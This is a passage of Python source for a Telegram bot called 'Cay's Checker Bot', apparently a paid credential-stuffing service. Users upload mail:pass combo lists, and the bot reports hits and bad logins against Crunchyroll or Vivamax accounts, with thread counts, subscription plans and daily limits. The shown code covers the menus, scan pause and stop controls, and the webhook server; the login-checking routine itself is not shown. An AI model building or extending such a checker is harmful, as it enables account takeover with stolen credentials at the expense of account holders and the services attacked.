<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner()}
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{files_display}</b></code>
👑 Plan: <code><b>{get_plan_with_emoji(stats.get('plan'))}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} combos</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))}</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        query = update_or_query.callback_query
        await query.edit_message_text(welcome, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update_or_query.message.reply_text(welcome, parse_mode='HTML', reply_markup=reply_markup)

async def manage_result_pin(update: Update, context: CallbackContext, message_id: int):
    """Unpin previous result and pin the new one (keeps only latest result pinned)"""
    chat_id = update.effective_chat.id
    
    # Unpin old result if exists (prevents chat clutter)
    old_id = context.user_data.get('last_pinned_result_id')
    if old_id:
        try:
            await context.bot.unpin_chat_message(chat_id=chat_id, message_id=old_id)
        except:
            pass  # already deleted or error
    
    # Pin the new result
    try:
        await context.bot.pin_chat_message(
            chat_id=chat_id,
            message_id=message_id,
            disable_notification=True
        )
        context.user_data['last_pinned_result_id'] = message_id
    except Exception as e:
        print(f"⚠️ Failed to pin result: {e}")

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    data = query.data

    # Handle verification button
    if data == "verify_join":
        if await check_subscription(update, context):
            await edit_to_main_menu(update, context)
        else:
            # ←←← THIS IS THE FIX
            await query.answer(
                "❌ You haven't joined the channel yet!\n\n"
                "Please join @caysredirect first, then tap Verify again.",
                show_alert=True
            )
            # Do NOT call send_join_channel_message again (prevents the error)
        return

    # Normal check for all other buttons
    if not await check_subscription(update, context):
        await query.answer("❌ You must join @caysredirect first!", show_alert=True)
        await send_join_channel_message(update, context)
        return

    if data == "menu_stats":
            context.user_data['in_main_menu'] = False
            await show_statistics_menu(query, context)
    
    elif data == "menu_referrals":
        context.user_data['in_main_menu'] = False
        await show_referrals_menu(query, context)
    
    elif data == "menu_rewards":
        context.user_data['in_main_menu'] = False
        await show_rewards_menu(query, context)

    elif data == "claim_daily_reward":
        await claim_daily_reward(query, context)

    elif data == "redeem_gift_code":
        await query.answer("📦 Gift code redemption coming soon!", show_alert=True)
        await show_rewards_menu(query, context)
    
    elif data == "menu_membership":
        context.user_data['in_main_menu'] = False
        await show_membership_menu(query, context)
    
    elif data == "menu_settings":
        context.user_data['in_main_menu'] = False
        await show_settings_menu(query, context)
    
    elif data == "set_threads":
        context.user_data['in_main_menu'] = False
        await handle_set_threads(query, context)
    
    elif data == "set_api_mode":
        context.user_data['in_main_menu'] = False
        await show_api_mode_menu(query, context)

    elif data.startswith("pause_scan:") or data.startswith("resume_scan:"):
        scan_id = data.split(":", 1)[1]
        current_status = get_scan_status(scan_id)
        
        new_status = "running" if current_status == "paused" else "paused"
        set_scan_status(scan_id, new_status)

        progress_msg = context.user_data.get('current_scan', {}).get('progress_msg')
        last = context.user_data.get('current_scan', {}).get('last_progress', {})

        if progress_msg and last:
            try:
                if new_status == "paused":
                    status_title = "📊 <b>Scan Paused</b> ⏸️ (Auto-resume in 30s)"
                    keyboard = [[
                        InlineKeyboardButton("▶️ Resume", callback_data=f"resume_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]
                else:
                    status_title = "📊 <b>Scan In Progress</b> 🔄"
                    keyboard = [[
                        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]

                reply_markup = InlineKeyboardMarkup(keyboard)

                await progress_msg.edit_text(
                    f"{status_title}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📁 File: <code>{last['file_name']}</code>\n"
                    f"🔢 <b>Processed:</b> <code>{last['completed']}/{last['total']}</code> (<code>{last['percent']}%</code>)\n"
                    f"🧵 <b>Threads:</b> <code>{last['threads']}</code>\n"
                    f"📡 <b>Mode:</b> <code>{last['mode']}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>Hits:</b> <code>{last['hits']}</code>\n"
                    f"❌ Bad: <code>{last['bad']}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱ <b>Elapsed:</b> <code>{last['elapsed_sec']//60:02d}m {last['elapsed_sec']%60:02d}s</code>\n"
                    f"⚡ <b>CPM:</b> <code>{last['cpm']}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"— Controls:\n"
                    f"Pause\n"
                    f"Resume\n"
                    f"Stop and send results\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                await query.answer(
                    "⏸️ Paused" if new_status == "paused" else "▶️ Resumed",
                    show_alert=False
                )
            except Exception as e:
                print(f"⚠️ Pause/Resume edit failed: {e}")
                await query.answer("⚠️ Update failed", show_alert=True)
        else:
            await query.answer(
                "⏸️ Paused" if new_status == "paused" else "▶️ Resumed",
                show_alert=False
            )
        return

    elif data.startswith("stop_scan:"):
        scan_id = data.split(":", 1)[1]
        set_scan_status(scan_id, "stopped")
        await query.answer("⏹️ Stopping scan...", show_alert=True)
        return

    elif data.startswith("set_mode:"):
        new_mode = data.split(":", 1)[1]
        user_id = query.from_user.id
        
        # === VIP-ONLY PROTECTION FOR VIVAMAX ===
        if new_mode == "Vivamax" and user_id != ADMIN_ID:
            stats = get_user_stats(user_id)
            user_plan = stats.get("plan", "FREE").upper()
            
            if user_plan not in ["VIP", "YEARLY"]:
                await query.answer("", show_alert=False)
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=(
                        "🔒 <b>Vivamax Mode</b> is restricted to <b>VIP</b> members only!\n\n"
                        "<a href='https://t.me/caydigitals'>@caydigitals</a>"
                    ),
                    parse_mode='HTML',
                    disable_web_page_preview=False
                )
                return

        stats = get_user_stats(user_id)
        current_mode = stats.get("api_mode", "Crunchyroll")

        if new_mode == current_mode:
            await query.answer("ℹ️ Already in this mode", show_alert=False)
            return

        update_user_stats(user_id, {"api_mode": new_mode})
        await query.answer(f"✅ Switched to {new_mode} Mode!", show_alert=False)
        await show_api_mode_menu(query, context)
    
    elif data == "back_to_main":
        await edit_to_main_menu(update, context)
    
    elif data == "menu_support":
        context.user_data['in_main_menu'] = False
        await show_support_menu(query, context)
    
    else:
        text = "Unknown option"
        await query.edit_message_text(text, parse_mode='HTML')

# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(CommandHandler("setplan", set_plan_command))
tg_app.add_handler(CommandHandler("resetreward", reset_reward_command))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
tg_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
tg_app.add_handler(CallbackQueryHandler(button_callback))

# ============== WEBHOOK ENDPOINT ==============
@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, tg_app.bot)
        
        # Process update safely
        await tg_app.process_update(update)
        return {"status": "ok"}
    
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        # Still return 200 so Telegram stops retrying
        return {"status": "error"}

@app.get("/")
async def root():
    return {
        "status": "✅ Bot is Running",
        "bot": "Cay's Checker Bot",
        "webhook": "/webhook"
    }

# Optional: Health check
@app.get("/webhook")
async def webhook_get():
    return {
        "status": "✅ Webhook is Active",
        "info": "Telegram uses POST requests only. This is normal."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)